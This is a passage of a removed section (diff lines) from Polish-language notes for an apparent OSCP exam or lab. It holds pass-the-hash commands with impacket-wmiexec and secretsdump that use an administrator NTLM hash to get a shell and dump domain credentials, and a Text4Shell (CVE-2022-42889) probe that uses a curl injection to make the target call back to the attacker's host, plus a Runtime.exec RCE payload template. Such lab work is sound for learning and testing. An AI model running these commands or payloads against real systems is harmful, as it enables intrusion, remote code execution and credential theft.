-proxychains -q impacket-wmiexec -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146
-#   --- w tym interaktywnym shellu (jako oscp\administrator): ---
-#   whoami ; type C:\Users\Administrator\Desktop\proof.txt   <-- PROOF.TXT (interaktywny shell, type)
-proxychains -q impacket-secretsdump -just-dc -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146  # krbtgt itd. (do raportu)
-```
-
-## E.7 .150 (Spring/Tomcat) — Text4Shell (do dokończenia)
-```bash
-# app REST: GET /search?query=  -> podatne na interpolacje ${...} (Apache Commons Text, CVE-2022-42889)
-# potwierdzone: url: lookup dziala (blind SSRF):
-curl -G http://192.168.224.150:8080/search --data-urlencode 'query=${url:UTF-8:http://<KALI>:8000/x}'   # -> callback na twoj serwer
-```
-> STATUS: potwierdzony blind SSRF przez `${url:...}` (interpolacja w sinku logowania — output niewidoczny). `${script:javascript:...}` (RCE) oraz `${file:}`/`${sys:}` NIE rozwiązują się (ograniczony zestaw lookupów), więc bezpośrednie RCE tym payloadem nie wyszło. Następny krok: wersja Commons Text z działającym `script:` daje RCE `${script:javascript:java.lang.Runtime.getRuntime().exec(...)}`; albo użyć SSRF do wewnętrznej usługi. NIEUKOŃCZONE.
